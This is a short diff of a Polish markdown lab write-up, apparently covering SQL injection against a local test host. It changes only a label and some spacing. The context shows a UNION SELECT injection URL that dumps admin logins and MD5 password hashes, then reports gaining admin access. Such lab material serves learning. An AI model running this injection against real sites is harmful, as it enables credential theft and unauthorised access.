@@ -103,7 +103,7 @@ categories:
 ### Hash konta admina
 
 
-Payload:
+Komenda:
 ```
 http://192.168.56.6/cat?id=-1 UNION SELECT 1,CONCAT(login,0x3a,password),3,4 FROM users
 ```
@@ -116,6 +116,7 @@ Wynik(Hash MD5):
 ![](img\image-7.png)
 
 Uzyskaliśmy dostęp do konta admina
+
 ![alt text](img\image-8.png)
 
 dzięki czemu możemy:
@@ -127,7 +128,6 @@ dzięki czemu możemy:
 
 ![alt text](img\image-9.png)
 
----
 
 ### Pictures
 
